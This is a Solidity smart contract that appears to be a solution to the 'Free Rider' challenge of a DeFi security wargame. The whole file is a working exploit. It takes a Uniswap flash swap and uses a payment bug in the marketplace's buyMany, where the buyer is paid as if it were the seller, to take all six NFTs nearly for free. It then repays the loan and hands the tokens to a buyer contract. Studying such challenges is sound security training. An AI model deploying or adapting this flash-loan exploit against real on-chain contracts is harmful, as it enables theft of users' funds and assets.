// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';

interface IWETH9 {
    function withdraw(uint256 amount0) external;

    function deposit() external payable;

    function transfer(address dst, uint256 wad) external returns (bool);

    function balanceOf(address addr) external returns (uint256);
}

contract FreeRiderAttack is IUniswapV2Callee {
    IUniswapV2Pair private uniswapPair;
    FreeRiderNFTMarketplace private marketPlace;
    IWETH9 private weth;
    ERC721 public nft;
    FreeRiderBuyer public buyer;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniswapPairAddress,
        address payable _marketPlace,
        address _wethAddress,
        address _nftAddress,
        address _buyer
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPairAddress);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        weth = IWETH9(_wethAddress);
        nft = ERC721(_nftAddress);
        buyer = FreeRiderBuyer(_buyer);
    }

    function attack(uint256 amount) external payable {
        //get a flash swap (loan)
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        // exchange the loaned weth to eth
        weth.withdraw(amount0);
        // buy all nfts for free with a single 15 eth loan, because of the bug in the marketplace contract
        // that incorrectly determines the seller's address as the buyer's in line 80
        marketPlace.buyMany{value: address(this).balance}(tokenIds);
        // exchange back the 15 eth to weth
        weth.deposit{value: address(this).balance}();
        // pay back the flash loan
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
        //transfer them to buyer
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
